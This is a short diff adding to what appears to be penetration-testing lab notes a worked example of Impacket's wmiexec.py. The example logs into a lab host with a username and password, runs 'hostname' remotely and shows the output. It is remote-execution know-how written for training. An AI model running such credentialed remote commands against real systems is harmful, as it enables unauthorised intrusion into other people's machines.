@@ -199,5 +199,10 @@ Info: Establishing connection to remote endpoint
 
 #### Impacket's `wmiexec.py`
 ```bash
+SonithGT@htb[/htb]$ /usr/share/doc/python3-impacket/examples/wmiexec.py Cry0l1t3:"P455w0rD!"@10.129.201.248 "hostname"
 
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] SMBv3.0 dialect used
+ILF-SQL-01
 ```
